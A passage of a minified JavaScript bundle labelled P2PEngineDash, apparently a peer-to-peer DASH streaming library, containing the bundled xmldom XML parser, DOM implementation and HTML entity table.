!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.P2PEngineDash=t():e.P2PEngineDash=t()}(self,(()=>(()=>{var __webpack_modules__={539:(e,t)=>{"use strict";function r(e,t){return void 0===t&&(t=Object),t&&"function"==typeof t.freeze?t.freeze(e):e}var s=r({HTML:"text/html",isHTML:function(e){return e===s.HTML},XML_APPLICATION:"application/xml",XML_TEXT:"text/xml",XML_XHTML_APPLICATION:"application/xhtml+xml",XML_SVG_IMAGE:"image/svg+xml"}),i=r({HTML:"http://www.w3.org/1999/xhtml",isHTML:function(e){return e===i.HTML},SVG:"http://www.w3.org/2000/svg",XML:"http://www.w3.org/XML/1998/namespace",XMLNS:"http://www.w3.org/2000/xmlns/"});t.freeze=r,t.MIME_TYPE=s,t.NAMESPACE=i},588:(e,t,r)=>{var s=r(539),i=r(89),n=r(369),o=r(835),a=i.DOMImplementation,h=s.NAMESPACE,c=o.ParseError,l=o.XMLReader;function u(e){this.options=e||{locator:{}}}function d(){this.cdata=!1}function f(e,t){t.lineNumber=e.lineNumber,t.columnNumber=e.columnNumber}function _(e){if(e)return"\n@"+(e.systemId||"")+"#[line:"+e.lineNumber+",col:"+e.columnNumber+"]"}function p(e,t,r){return"string"==typeof e?e.substr(t,r):e.length>=t+r||t?new java.lang.String(e,t,r)+"":e}function g(e,t){e.currentElement?e.currentElement.appendChild(t):e.doc.appendChild(t)}u.prototype.parseFromString=function(e,t){var r=this.options,s=new l,i=r.domBuilder||new d,o=r.errorHandler,a=r.locator,c=r.xmlns||{},u=/\/x?html?$/.test(t),f=u?n.HTML_ENTITIES:n.XML_ENTITIES;return a&&i.setDocumentLocator(a),s.errorHandler=function(e,t,r){if(!e){if(t instanceof d)return t;e=t}var s={},i=e instanceof Function;function n(t){var n=e[t];!n&&i&&(n=2==e.length?function(r){e(t,r)}:e),s[t]=n&&function(e){n("[xmldom "+t+"]\t"+e+_(r))}||function(){}}return r=r||{},n("warning"),n("error"),n("fatalError"),s}(o,i,a),s.domBuilder=r.domBuilder||i,u&&(c[""]=h.HTML),c.xml=c.xml||h.XML,e&&"string"==typeof e?s.parse(e,c,f):s.errorHandler.error("invalid doc source"),i.doc},d.prototype={startDocument:function(){this.doc=(new a).createDocument(null,null,null),this.locator&&(this.doc.documentURI=this.locator.systemId)},startElement:function(e,t,r,s){var i=this.doc,n=i.createElementNS(e,r||t),o=s.length;g(this,n),this.currentElement=n,this.locator&&f(this.locator,n);for(var a=0;a<o;a++){e=s.getURI(a);var h=s.getValue(a),c=(r=s.getQName(a),i.createAttributeNS(e,r));this.locator&&f(s.getLocator(a),c),c.value=c.nodeValue=h,n.setAttributeNode(c)}},endElement:function(e,t,r){var s=this.currentElement;s.tagName;this.currentElement=s.parentNode},startPrefixMapping:function(e,t){},endPrefixMapping:function(e){},processingInstruction:function(e,t){var r=this.doc.createProcessingInstruction(e,t);this.locator&&f(this.locator,r),g(this,r)},ignorableWhitespace:function(e,t,r){},characters:function(e,t,r){if(e=p.apply(this,arguments)){if(this.cdata)var s=this.doc.createCDATASection(e);else s=this.doc.createTextNode(e);this.currentElement?this.currentElement.appendChild(s):/^\s*$/.test(e)&&this.doc.appendChild(s),this.locator&&f(this.locator,s)}},skippedEntity:function(e){},endDocument:function(){this.doc.normalize()},setDocumentLocator:function(e){(this.locator=e)&&(e.lineNumber=0)},comment:function(e,t,r){e=p.apply(this,arguments);var s=this.doc.createComment(e);this.locator&&f(this.locator,s),g(this,s)},startCDATA:function(){this.cdata=!0},endCDATA:function(){this.cdata=!1},startDTD:function(e,t,r){var s=this.doc.implementation;if(s&&s.createDocumentType){var i=s.createDocumentType(e,t,r);this.locator&&f(this.locator,i),g(this,i),this.doc.doctype=i}},warning:function(e){console.warn("[xmldom warning]\t"+e,_(this.locator))},error:function(e){console.error("[xmldom error]\t"+e,_(this.locator))},fatalError:function(e){throw new c(e,this.locator)}},"endDTD,startEntity,endEntity,attributeDecl,elementDecl,externalEntityDecl,internalEntityDecl,resolveEntity,getExternalSubset,notationDecl,unparsedEntityDecl".replace(/\w+/g,(function(e){d.prototype[e]=function(){return null}})),t.DOMParser=u,i.DOMImplementation,i.XMLSerializer},89:(e,t,r)=>{var s=r(539).NAMESPACE;function i(e){return""!==e}function n(e,t){return e.hasOwnProperty(t)||(e[t]=!0),e}function o(e){if(!e)return[];var t=function(e){return e?e.split(/[\t\n\f\r ]+/).filter(i):[]}(e);return Object.keys(t.reduce(n,{}))}function a(e,t){for(var r in e)t[r]=e[r]}function h(e,t){var r=e.prototype;if(!(r instanceof t)){function s(){}s.prototype=t.prototype,a(r,s=new s),e.prototype=r=s}r.constructor!=e&&("function"!=typeof e&&console.error("unknown Class:"+e),r.constructor=e)}var c={},l=c.ELEMENT_NODE=1,u=c.ATTRIBUTE_NODE=2,d=c.TEXT_NODE=3,f=c.CDATA_SECTION_NODE=4,_=c.ENTITY_REFERENCE_NODE=5,p=c.ENTITY_NODE=6,g=c.PROCESSING_INSTRUCTION_NODE=7,m=c.COMMENT_NODE=8,E=c.DOCUMENT_NODE=9,y=c.DOCUMENT_TYPE_NODE=10,b=c.DOCUMENT_FRAGMENT_NODE=11,S=c.NOTATION_NODE=12,v={},T={},P=(v.INDEX_SIZE_ERR=(T[1]="Index size error",1),v.DOMSTRING_SIZE_ERR=(T[2]="DOMString size error",2),v.HIERARCHY_REQUEST_ERR=(T[3]="Hierarchy request error",3)),w=(v.WRONG_DOCUMENT_ERR=(T[4]="Wrong document",4),v.INVALID_CHARACTER_ERR=(T[5]="Invalid character",5),v.NO_DATA_ALLOWED_ERR=(T[6]="No data allowed",6),v.NO_MODIFICATION_ALLOWED_ERR=(T[7]="No modification allowed",7),v.NOT_FOUND_ERR=(T[8]="Not found",8)),R=(v.NOT_SUPPORTED_ERR=(T[9]="Not supported",9),v.INUSE_ATTRIBUTE_ERR=(T[10]="Attribute in use",10));v.INVALID_STATE_ERR=(T[11]="Invalid state",11),v.SYNTAX_ERR=(T[12]="Syntax error",12),v.INVALID_MODIFICATION_ERR=(T[13]="Invalid modification",13),v.NAMESPACE_ERR=(T[14]="Invalid namespace",14),v.INVALID_ACCESS_ERR=(T[15]="Invalid access",15);function A(e,t){if(t instanceof Error)var r=t;else r=this,Error.call(this,T[e]),this.message=T[e],Error.captureStackTrace&&Error.captureStackTrace(this,A);return r.code=e,t&&(this.message=this.message+": "+t),r}function I(){}function C(e,t){this._node=e,this._refresh=t,D(this)}function D(e){var t=e._node._inc||e._node.ownerDocument._inc;if(e._inc!=t){var r=e._refresh(e._node);ce(e,"length",r.length),a(r,e),e._inc=t}}function N(){}function L(e,t){for(var r=e.length;r--;)if(e[r]===t)return r}function O(e,t,r,i){if(i?t[L(t,i)]=r:t[t.length++]=r,e){r.ownerElement=e;var n=e.ownerDocument;n&&(i&&q(n,e,i),function(e,t,r){e&&e._inc++,r.namespaceURI===s.XMLNS&&(t._nsMap[r.prefix?r.localName:""]=r.value)}(n,e,r))}}function M(e,t,r){var s=L(t,r);if(!(s>=0))throw A(w,new Error(e.tagName+"@"+r));for(var i=t.length-1;s<i;)t[s]=t[++s];if(t.length=i,e){var n=e.ownerDocument;n&&(q(n,e,r),r.ownerElement=null)}}function x(){}function F(){}function B(e){return("<"==e?"&lt;":">"==e&&"&gt;")||"&"==e&&"&amp;"||'"'==e&&"&quot;"||"&#"+e.charCodeAt()+";"}function U(e,t){if(t(e))return!0;if(e=e.firstChild)do{if(U(e,t))return!0}while(e=e.nextSibling)}function k(){}function q(e,t,r,i){e&&e._inc++,r.namespaceURI===s.XMLNS&&delete t._nsMap[r.prefix?r.localName:""]}function G(e,t,r){if(e&&e._inc){e._inc++;var s=t.childNodes;if(r)s[s.length++]=r;else{for(var i=t.firstChild,n=0;i;)s[n++]=i,i=i.nextSibling;s.length=n}}}function $(e,t){var r=t.previousSibling,s=t.nextSibling;return r?r.nextSibling=s:e.firstChild=s,s?s.previousSibling=r:e.lastChild=r,G(e.ownerDocument,e),t}function z(e,t,r){var s=t.parentNode;if(s&&s.removeChild(t),t.nodeType===b){var i=t.firstChild;if(null==i)return t;var n=t.lastChild}else i=n=t;var o=r?r.previousSibling:e.lastChild;i.previousSibling=o,n.nextSibling=r,o?o.nextSibling=i:e.firstChild=i,null==r?e.lastChild=n:r.previousSibling=n;do{i.parentNode=e}while(i!==n&&(i=i.nextSibling));return G(e.ownerDocument||e,e),t.nodeType==b&&(t.firstChild=t.lastChild=null),t}function H(){this._nsMap={}}function V(){}function W(){}function j(){}function Y(){}function X(){}function K(){}function Q(){}function J(){}function Z(){}function ee(){}function te(){}function re(){}function se(e,t){var r=[],s=9==this.nodeType&&this.documentElement||this,i=s.prefix,n=s.namespaceURI;if(n&&null==i&&null==(i=s.lookupPrefix(n)))var o=[{namespace:n,prefix:null}];return oe(this,r,e,t,o),r.join("")}function ie(e,t,r){var i=e.prefix||"",n=e.namespaceURI;if(!n)return!1;if("xml"===i&&n===s.XML||n===s.XMLNS)return!1;for(var o=r.length;o--;){var a=r[o];if(a.prefix===i)return a.namespace!==n}return!0}function ne(e,t,r){e.push(" ",t,'="',r.replace(/[<&"]/g,B),'"')}function oe(e,t,r,i,n){if(n||(n=[]),i){if(!(e=i(e)))return;if("string"==typeof e)return void t.push(e)}switch(e.nodeType){case l:var o=e.attributes,a=o.length,h=e.firstChild,c=e.tagName,p=c;if(!(r=s.isHTML(e.namespaceURI)||r)&&!e.prefix&&e.namespaceURI){for(var S,v=0;v<o.length;v++)if("xmlns"===o.item(v).name){S=o.item(v).value;break}if(!S)for(var T=n.length-1;T>=0;T--){if(""===(P=n[T]).prefix&&P.namespace===e.namespaceURI){S=P.namespace;break}}if(S!==e.namespaceURI)for(T=n.length-1;T>=0;T--){var P;if((P=n[T]).namespace===e.namespaceURI){P.prefix&&(p=P.prefix+":"+c);break}}}t.push("<",p);for(var w=0;w<a;w++){"xmlns"==(R=o.item(w)).prefix?n.push({prefix:R.localName,namespace:R.value}):"xmlns"==R.nodeName&&n.push({prefix:"",namespace:R.value})}for(w=0;w<a;w++){var R,A,I;if(ie(R=o.item(w),0,n))ne(t,(A=R.prefix||"")?"xmlns:"+A:"xmlns",I=R.namespaceURI),n.push({prefix:A,namespace:I});oe(R,t,r,i,n)}if(c===p&&ie(e,0,n))ne(t,(A=e.prefix||"")?"xmlns:"+A:"xmlns",I=e.namespaceURI),n.push({prefix:A,namespace:I});if(h||r&&!/^(?:meta|link|img|br|hr|input)$/i.test(c)){if(t.push(">"),r&&/^script$/i.test(c))for(;h;)h.data?t.push(h.data):oe(h,t,r,i,n.slice()),h=h.nextSibling;else for(;h;)oe(h,t,r,i,n.slice()),h=h.nextSibling;t.push("</",p,">")}else t.push("/>");return;case E:case b:for(h=e.firstChild;h;)oe(h,t,r,i,n.slice()),h=h.nextSibling;return;case u:return ne(t,e.name,e.value);case d:return t.push(e.data.replace(/[<&]/g,B).replace(/]]>/g,"]]&gt;"));case f:return t.push("<![CDATA[",e.data,"]]>");case m:return t.push("\x3c!--",e.data,"--\x3e");case y:var C=e.publicId,D=e.systemId;if(t.push("<!DOCTYPE ",e.name),C)t.push(" PUBLIC ",C),D&&"."!=D&&t.push(" ",D),t.push(">");else if(D&&"."!=D)t.push(" SYSTEM ",D,">");else{var N=e.internalSubset;N&&t.push(" [",N,"]"),t.push(">")}return;case g:return t.push("<?",e.target," ",e.data,"?>");case _:return t.push("&",e.nodeName,";");default:t.push("??",e.nodeName)}}function ae(e,t,r){var s;switch(t.nodeType){case l:(s=t.cloneNode(!1)).ownerDocument=e;case b:break;case u:r=!0}if(s||(s=t.cloneNode(!1)),s.ownerDocument=e,s.parentNode=null,r)for(var i=t.firstChild;i;)s.appendChild(ae(e,i,r)),i=i.nextSibling;return s}function he(e,t,r){var s=new t.constructor;for(var i in t){var n=t[i];"object"!=typeof n&&n!=s[i]&&(s[i]=n)}switch(t.childNodes&&(s.childNodes=new I),s.ownerDocument=e,s.nodeType){case l:var o=t.attributes,a=s.attributes=new N,h=o.length;a._ownerElement=s;for(var c=0;c<h;c++)s.setAttributeNode(he(e,o.item(c),!0));break;case u:r=!0}if(r)for(var d=t.firstChild;d;)s.appendChild(he(e,d,r)),d=d.nextSibling;return s}function ce(e,t,r){e[t]=r}A.prototype=Error.prototype,a(v,A),I.prototype={length:0,item:function(e){return this[e]||null},toString:function(e,t){for(var r=[],s=0;s<this.length;s++)oe(this[s],r,e,t);return r.join("")}},C.prototype.item=function(e){return D(this),this[e]},h(C,I),N.prototype={length:0,item:I.prototype.item,getNamedItem:function(e){for(var t=this.length;t--;){var r=this[t];if(r.nodeName==e)return r}},setNamedItem:function(e){var t=e.ownerElement;if(t&&t!=this._ownerElement)throw new A(R);var r=this.getNamedItem(e.nodeName);return O(this._ownerElement,this,e,r),r},setNamedItemNS:function(e){var t,r=e.ownerElement;if(r&&r!=this._ownerElement)throw new A(R);return t=this.getNamedItemNS(e.namespaceURI,e.localName),O(this._ownerElement,this,e,t),t},removeNamedItem:function(e){var t=this.getNamedItem(e);return M(this._ownerElement,this,t),t},removeNamedItemNS:function(e,t){var r=this.getNamedItemNS(e,t);return M(this._ownerElement,this,r),r},getNamedItemNS:function(e,t){for(var r=this.length;r--;){var s=this[r];if(s.localName==t&&s.namespaceURI==e)return s}return null}},x.prototype={hasFeature:function(e,t){return!0},createDocument:function(e,t,r){var s=new k;if(s.implementation=this,s.childNodes=new I,s.doctype=r||null,r&&s.appendChild(r),t){var i=s.createElementNS(e,t);s.appendChild(i)}return s},createDocumentType:function(e,t,r){var s=new K;return s.name=e,s.nodeName=e,s.publicId=t||"",s.systemId=r||"",s}},F.prototype={firstChild:null,lastChild:null,previousSibling:null,nextSibling:null,attributes:null,parentNode:null,childNodes:null,ownerDocument:null,nodeValue:null,namespaceURI:null,prefix:null,localName:null,insertBefore:function(e,t){return z(this,e,t)},replaceChild:function(e,t){this.insertBefore(e,t),t&&this.removeChild(t)},removeChild:function(e){return $(this,e)},appendChild:function(e){return this.insertBefore(e,null)},hasChildNodes:function(){return null!=this.firstChild},cloneNode:function(e){return he(this.ownerDocument||this,this,e)},normalize:function(){for(var e=this.firstChild;e;){var t=e.nextSibling;t&&t.nodeType==d&&e.nodeType==d?(this.removeChild(t),e.appendData(t.data)):(e.normalize(),e=t)}},isSupported:function(e,t){return this.ownerDocument.implementation.hasFeature(e,t)},hasAttributes:function(){return this.attributes.length>0},lookupPrefix:function(e){for(var t=this;t;){var r=t._nsMap;if(r)for(var s in r)if(r[s]==e)return s;t=t.nodeType==u?t.ownerDocument:t.parentNode}return null},lookupNamespaceURI:function(e){for(var t=this;t;){var r=t._nsMap;if(r&&e in r)return r[e];t=t.nodeType==u?t.ownerDocument:t.parentNode}return null},isDefaultNamespace:function(e){return null==this.lookupPrefix(e)}},a(c,F),a(c,F.prototype),k.prototype={nodeName:"#document",nodeType:E,doctype:null,documentElement:null,_inc:1,insertBefore:function(e,t){if(e.nodeType==b){for(var r=e.firstChild;r;){var s=r.nextSibling;this.insertBefore(r,t),r=s}return e}return null==this.documentElement&&e.nodeType==l&&(this.documentElement=e),z(this,e,t),e.ownerDocument=this,e},removeChild:function(e){return this.documentElement==e&&(this.documentElement=null),$(this,e)},importNode:function(e,t){return ae(this,e,t)},getElementById:function(e){var t=null;return U(this.documentElement,(function(r){if(r.nodeType==l&&r.getAttribute("id")==e)return t=r,!0})),t},getElementsByClassName:function(e){var t=o(e);return new C(this,(function(r){var s=[];return t.length>0&&U(r.documentElement,(function(i){if(i!==r&&i.nodeType===l){var n=i.getAttribute("class");if(n){var a=e===n;if(!a){var h=o(n);a=t.every((c=h,function(e){return c&&-1!==c.indexOf(e)}))}a&&s.push(i)}}var c})),s}))},createElement:function(e){var t=new H;return t.ownerDocument=this,t.nodeName=e,t.tagName=e,t.localName=e,t.childNodes=new I,(t.attributes=new N)._ownerElement=t,t},createDocumentFragment:function(){var e=new ee;return e.ownerDocument=this,e.childNodes=new I,e},createTextNode:function(e){var t=new j;return t.ownerDocument=this,t.appendData(e),t},createComment:function(e){var t=new Y;return t.ownerDocument=this,t.appendData(e),t},createCDATASection:function(e){var t=new X;return t.ownerDocument=this,t.appendData(e),t},createProcessingInstruction:function(e,t){var r=new te;return r.ownerDocument=this,r.tagName=r.target=e,r.nodeValue=r.data=t,r},createAttribute:function(e){var t=new V;return t.ownerDocument=this,t.name=e,t.nodeName=e,t.localName=e,t.specified=!0,t},createEntityReference:function(e){var t=new Z;return t.ownerDocument=this,t.nodeName=e,t},createElementNS:function(e,t){var r=new H,s=t.split(":"),i=r.attributes=new N;return r.childNodes=new I,r.ownerDocument=this,r.nodeName=t,r.tagName=t,r.namespaceURI=e,2==s.length?(r.prefix=s[0],r.localName=s[1]):r.localName=t,i._ownerElement=r,r},createAttributeNS:function(e,t){var r=new V,s=t.split(":");return r.ownerDocument=this,r.nodeName=t,r.name=t,r.namespaceURI=e,r.specified=!0,2==s.length?(r.prefix=s[0],r.localName=s[1]):r.localName=t,r}},h(k,F),H.prototype={nodeType:l,hasAttribute:function(e){return null!=this.getAttributeNode(e)},getAttribute:function(e){var t=this.getAttributeNode(e);return t&&t.value||""},getAttributeNode:function(e){return this.attributes.getNamedItem(e)},setAttribute:function(e,t){var r=this.ownerDocument.createAttribute(e);r.value=r.nodeValue=""+t,this.setAttributeNode(r)},removeAttribute:function(e){var t=this.getAttributeNode(e);t&&this.removeAttributeNode(t)},appendChild:function(e){return e.nodeType===b?this.insertBefore(e,null):function(e,t){var r=t.parentNode;if(r){var s=e.lastChild;r.removeChild(t),s=e.lastChild}return s=e.lastChild,t.parentNode=e,t.previousSibling=s,t.nextSibling=null,s?s.nextSibling=t:e.firstChild=t,e.lastChild=t,G(e.ownerDocument,e,t),t}(this,e)},setAttributeNode:function(e){return this.attributes.setNamedItem(e)},setAttributeNodeNS:function(e){return this.attributes.setNamedItemNS(e)},removeAttributeNode:function(e){return this.attributes.removeNamedItem(e.nodeName)},removeAttributeNS:function(e,t){var r=this.getAttributeNodeNS(e,t);r&&this.removeAttributeNode(r)},hasAttributeNS:function(e,t){return null!=this.getAttributeNodeNS(e,t)},getAttributeNS:function(e,t){var r=this.getAttributeNodeNS(e,t);return r&&r.value||""},setAttributeNS:function(e,t,r){var s=this.ownerDocument.createAttributeNS(e,t);s.value=s.nodeValue=""+r,this.setAttributeNode(s)},getAttributeNodeNS:function(e,t){return this.attributes.getNamedItemNS(e,t)},getElementsByTagName:function(e){return new C(this,(function(t){var r=[];return U(t,(function(s){s===t||s.nodeType!=l||"*"!==e&&s.tagName!=e||r.push(s)})),r}))},getElementsByTagNameNS:function(e,t){return new C(this,(function(r){var s=[];return U(r,(function(i){i===r||i.nodeType!==l||"*"!==e&&i.namespaceURI!==e||"*"!==t&&i.localName!=t||s.push(i)})),s}))}},k.prototype.getElementsByTagName=H.prototype.getElementsByTagName,k.prototype.getElementsByTagNameNS=H.prototype.getElementsByTagNameNS,h(H,F),V.prototype.nodeType=u,h(V,F),W.prototype={data:"",substringData:function(e,t){return this.data.substring(e,e+t)},appendData:function(e){e=this.data+e,this.nodeValue=this.data=e,this.length=e.length},insertData:function(e,t){this.replaceData(e,0,t)},appendChild:function(e){throw new Error(T[P])},deleteData:function(e,t){this.replaceData(e,t,"")},replaceData:function(e,t,r){r=this.data.substring(0,e)+r+this.data.substring(e+t),this.nodeValue=this.data=r,this.length=r.length}},h(W,F),j.prototype={nodeName:"#text",nodeType:d,splitText:function(e){var t=this.data,r=t.substring(e);t=t.substring(0,e),this.data=this.nodeValue=t,this.length=t.length;var s=this.ownerDocument.createTextNode(r);return this.parentNode&&this.parentNode.insertBefore(s,this.nextSibling),s}},h(j,W),Y.prototype={nodeName:"#comment",nodeType:m},h(Y,W),X.prototype={nodeName:"#cdata-section",nodeType:f},h(X,W),K.prototype.nodeType=y,h(K,F),Q.prototype.nodeType=S,h(Q,F),J.prototype.nodeType=p,h(J,F),Z.prototype.nodeType=_,h(Z,F),ee.prototype.nodeName="#document-fragment",ee.prototype.nodeType=b,h(ee,F),te.prototype.nodeType=g,h(te,F),re.prototype.serializeToString=function(e,t,r){return se.call(e,t,r)},F.prototype.toString=se;try{if(Object.defineProperty){function le(e){switch(e.nodeType){case l:case b:var t=[];for(e=e.firstChild;e;)7!==e.nodeType&&8!==e.nodeType&&t.push(le(e)),e=e.nextSibling;return t.join("");default:return e.nodeValue}}Object.defineProperty(C.prototype,"length",{get:function(){return D(this),this.$$length}}),Object.defineProperty(F.prototype,"textContent",{get:function(){return le(this)},set:function(e){switch(this.nodeType){case l:case b:for(;this.firstChild;)this.removeChild(this.firstChild);(e||String(e))&&this.appendChild(this.ownerDocument.createTextNode(e));break;default:this.data=e,this.value=e,this.nodeValue=e}}}),ce=function(e,t,r){e["$$"+t]=r}}}catch(ue){}t.DocumentType=K,t.DOMException=A,t.DOMImplementation=x,t.Element=H,t.Node=F,t.NodeList=I,t.XMLSerializer=re},369:(e,t,r)=>{var s=r(539).freeze;t.XML_ENTITIES=s({amp:"&",apos:"'",gt:">",lt:"<",quot:'"'}),t.HTML_ENTITIES=s({lt:"<",gt:">",amp:"&",quot:'"',apos:"'",Agrave:"À",Aacute:"Á",Acirc:"Â",Atilde:"Ã",Auml:"Ä",Aring:"Å",AElig:"Æ",Ccedil:"Ç",Egrave:"È",Eacute:"É",Ecirc:"Ê",Euml:"Ë",Igrave:"Ì",Iacute:"Í",Icirc:"Î",Iuml:"Ï",ETH:"Ð",Ntilde:"Ñ",Ograve:"Ò",Oacute:"Ó",Ocirc:"Ô",Otilde:"Õ",Ouml:"Ö",Oslash:"Ø",Ugrave:"Ù",Uacute:"Ú",Ucirc:"Û",Uuml:"Ü",Yacute:"Ý",THORN:"Þ",szlig:"ß",agrave:"à",aacute:"á",acirc:"â",atilde:"ã",auml:"ä",aring:"å",aelig:"æ",ccedil:"ç",egrave:"è",eacute:"é",ecirc:"ê",euml:"ë",igrave:"ì",iacute:"í",icirc:"î",iuml:"ï",eth:"ð",ntilde:"ñ",ograve:"ò",oacute:"ó",ocirc:"ô",otilde:"õ",ouml:"ö",oslash:"ø",ugrave:"ù",uacute:"ú",ucirc:"û",uuml:"ü",yacute:"ý",thorn:"þ",yuml:"ÿ",nbsp:" ",iexcl:"¡",cent:"¢",pound:"£",curren:"¤",yen:"¥",brvbar:"¦",sect:"§",uml:"¨",copy:"©",ordf:"ª",laquo:"«",not:"¬",shy:"­­",reg:"®",macr:"¯",deg:"°",plusmn:"±",sup2:"²",sup3:"³",acute:"´",micro:"µ",para:"¶",middot:"·",cedil:"¸",sup1:"¹",ordm:"º",raquo:"»",frac14:"¼",frac12:"½",frac34:"¾",iquest:"¿",times:"×",divide:"÷",forall:"∀",part:"∂",exist:"∃",empty:"∅",nabla:"∇",isin:"∈",notin:"∉",ni:"∋",prod:"∏",sum:"∑",minus:"−",lowast:"∗",radic:"√",prop:"∝",infin:"∞",ang:"∠",and:"∧",or:"∨",cap:"∩",cup:"∪",int:"∫",there4:"∴",sim:"∼",cong:"≅",asymp:"≈",ne:"≠",equiv:"≡",le:"≤",ge:"≥",sub:"⊂",sup:"⊃",nsub:"⊄",sube:"⊆",supe:"⊇",oplus:"⊕",otimes:"⊗",perp:"⊥",sdot:"⋅",Alpha:"Α",Beta:"Β",Gamma:"Γ",Delta:"Δ",Epsilon:"Ε",Zeta:"Ζ",Eta:"Η",Theta:"Θ",Iota:"Ι",Kappa:"Κ",Lambda:"Λ",Mu:"Μ",Nu:"Ν",Xi:"Ξ",Omicron:"Ο",Pi:"Π",Rho:"Ρ",Sigma:"Σ",Tau:"Τ",Upsilon:"Υ",Phi:"Φ",Chi:"Χ",Psi:"Ψ",Omega:"Ω",alpha:"α",beta:"β",gamma:"γ",delta:"δ",epsilon:"ε",zeta:"ζ",eta:"η",theta:"θ",iota:"ι",kappa:"κ",lambda:"λ",mu:"μ",nu:"ν",xi:"ξ",omicron:"ο",pi:"π",rho:"ρ",sigmaf:"ς",sigma:"σ",tau:"τ",upsilon:"υ",phi:"φ",chi:"χ",psi:"ψ",omega:"ω",thetasym:"ϑ",upsih:"ϒ",piv:"ϖ",OElig:"Œ",oelig:"œ",Scaron:"Š",scaron:"š",Yuml:"Ÿ",fnof:"ƒ",circ:"ˆ",tilde:"˜",ensp:" ",emsp:" ",thinsp:" ",zwnj:"‌",zwj:"‍",lrm:"‎",rlm:"‏",ndash:"–",mdash:"—",lsquo:"‘",rsquo:"’",sbquo:"‚",ldquo:"“",rdquo:"”",bdquo:"„",dagger:"†",Dagger:"‡",bull:"•",hellip:"…",permil:"‰",prime:"′",Prime:"″",lsaquo:"‹",rsaquo:"›",oline:"‾",euro:"€",trade:"™",larr:"←",uarr:"↑",rarr:"→",darr:"↓",harr:"↔",crarr:"↵",lceil:"⌈",rceil:"⌉",lfloor:"⌊",rfloor:"⌋",loz:"◊",spades:"♠",clubs:"♣",hearts:"♥",diams:"♦"}),t.entityMap=t.HTML_ENTITIES},716:(e,t,r)=>{var s=r(89);s.DOMImplementation,s.XMLSerializer,t.DOMParser=r(588).DOMParser},835:(e,t,r)=>{var s=r(539).NAMESPACE,i=/[A-Z_a-z\xC0-\xD6\xD8-\xF6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD]/,n=new RegExp("[\\-\\.0-9"+i.source.slice(1,-1)+"\\u00B7\\u0300-\\u036F\\u203F-\\u2040]"),o=new RegExp("^"+i.source+n.source+"*(?::"+i.source+n.source+"*)?$");function a(e,t){this.message=e,this.locator=t,Error.captureStackTrace&&Error.captureStackTrace(this,a)}function h(){}function c(e,t){return t.lineNumber=e.lineNumber,t.columnNumber=e.columnNumber,t}function l(e,t,r,i,n,o){function a(e,t,s){r.attributeNames.hasOwnProperty(e)&&o.fatalError("Attribute "+e+" redefined"),r.addValue(e,t,s)}for(var h,c=++t,l=0;;){var u=e.charAt(c);switch(u){case"=":if(1===l)h=e.slice(t,c),l=3;else{if(2!==l)throw new Error("attribute equal must after attrName");l=3}break;case"'":case'"':if(3===l||1===l){if(1===l&&(o.warning('attribute value must after "="'),h=e.slice(t,c)),t=c+1,!((c=e.indexOf(u,t))>0))throw new Error("attribute value no end '"+u+"' match");a(h,d=e.slice(t,c).replace(/&#?\w+;/g,n),t-1),l=5}else{if(4!=l)throw new Error('attribute value must after "="');a(h,d=e.slice(t,c).replace(/&#?\w+;/g,n),t),o.warning('attribute "'+h+'" missed start quot('+u+")!!"),t=c+1,l=5}break;case"/":switch(l){case 0:r.setTagName(e.slice(t,c));case 5:case 6:case 7:l=7,r.closed=!0;case 4:case 1:case 2:break;default:throw new Error("attribute invalid close char('/')")}break;case"":return o.error("unexpected end of input"),0==l&&r.setTagName(e.slice(t,c)),c;case">":switch(l){case 0:r.setTagName(e.slice(t,c));case 5:case 6:case 7:break;case 4:case 1:"/"===(d=e.slice(t,c)).slice(-1)&&(r.closed=!0,d=d.slice(0,-1));case 2:2===l&&(d=h),4==l?(o.warning('attribute "'+d+'" missed quot(")!'),a(h,d.replace(/&#?\w+;/g,n),t)):(s.isHTML(i[""])&&d.match(/^(?:disabled|checked|selected)$/i)||o.warning('attribute "'+d+'" missed value!! "'+d+'" instead!!'),a(d,d,t));break;case 3:throw new Error("attribute value missed!!")}return c;case"":u=" ";default:if(u<=" ")switch(l){case 0:r.setTagName(e.slice(t,c)),l=6;break;case 1:h=e.slice(t,c),l=2;break;case 4:var d=e.slice(t,c).replace(/&#?\w+;/g,n);o.warning('attribute "'+d+'" missed quot(")!!'),a(h,d,t);case 5:l=6}else switch(l){case 2:r.tagName;s.isHTML(i[""])&&h.match(/^(?:disabled|checked|selected)$/i)||o.warning('attribute "'+h+'" missed value!! "'+h+'" instead2!!'),a(h,h,t),t=c,l=1;break;case 5:o.warning('attribute space is required"'+h+'"!!');case 6:l=1,t=c;break;case 3:l=4,t=c;break;case 7:throw new Error("elements closed character '/' and '>' must be connected to")}}c++}}function u(e,t,r){for(var i=e.tagName,n=null,o=e.length;o--;){var a=e[o],h=a.qName,c=a.value;if((f=h.indexOf(":"))>0)var l=a.prefix=h.slice(0,f),u=h.slice(f+1),d="xmlns"===l&&u;else u=h,l=null,d="xmlns"===h&&"";a.localName=u,!1!==d&&(null==n&&(n={},_(r,r={})),r[d]=n[d]=c,a.uri=s.XMLNS,t.startPrefixMapping(d,c))}for(o=e.length;o--;){(l=(a=e[o]).prefix)&&("xml"===l&&(a.uri=s.XML),"xmlns"!==l&&(a.uri=r[l||""]))}var f;(f=i.indexOf(":"))>0?(l=e.prefix=i.slice(0,f),u=e.localName=i.slice(f+1)):(l=null,u=e.localName=i);var p=e.uri=r[l||""];if(t.startElement(p,u,i,e),!e.closed)return e.currentNSMap=r,e.localNSMap=n,!0;if(t.endElement(p,u,i),n)for(l in n)t.endPrefixMapping(l)}function d(e,t,r,s,i){if(/^(?:script|textarea)$/i.test(r)){var n=e.indexOf("</"+r+">",t),o=e.substring(t+1,n);if(/[&<]/.test(o))return/^script$/i.test(r)?(i.characters(o,0,o.length),n):(o=o.replace(/&#?\w+;/g,s),i.characters(o,0,o.length),n)}return t+1}function f(e,t,r,s){var i=s[r];return null==i&&((i=e.lastIndexOf("</"+r+">"))<t&&(i=e.lastIndexOf("</"+r)),s[r]=i),i<t}function _(e,t){for(var r in e)t[r]=e[r]}function p(e,t,r,s){if("-"===e.charAt(t+2))return"-"===e.charAt(t+3)?(i=e.indexOf("--\x3e",t+4))>t?(r.comment(e,t+4,i-t-4),i+3):(s.error("Unclosed 